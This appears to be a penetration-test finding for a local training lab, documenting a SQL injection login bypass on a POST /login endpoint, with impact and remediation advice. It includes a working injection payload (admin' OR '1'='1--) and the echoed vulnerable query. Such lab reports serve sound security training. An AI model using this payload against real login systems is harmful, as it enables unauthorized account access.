# Login SQL Injection — WebSploit `hydra-nexus`

## Target

http://127.0.0.1:5010

## Endpoint

POST /login

## Vulnerability

SQL Injection in Authentication

## Proof of Concept

The following input was supplied:

```text
username=admin' OR '1'='1-- 
password=anything
```

The application returned:

```text
Login Successful
Welcome back, admin!
Role: admin
```

## Evidence

The application displayed the SQL query that it executed:

```text
SELECT * FROM users WHERE username = 'admin' OR '1'='1-- ' AND password = '<MD5 hash>'
```

This demonstrates that the username parameter was incorporated directly
into the SQL statement without parameterization.

## Impact

An attacker can manipulate the authentication query and potentially
bypass password verification, resulting in unauthorized account access.

In this test, the application authenticated the request as the
administrator account.

## Root Cause

User-controlled input is concatenated directly into a SQL query.

## Remediation

* Use parameterized SQL queries/prepared statements.
* Never concatenate user input into SQL statements.
* Use secure password hashing rather than MD5.
* Implement centralized authentication and authorization controls.
* Return generic authentication errors without exposing SQL queries.

## Scope

127.0.0.1:5010 — local WebSploit training environment.
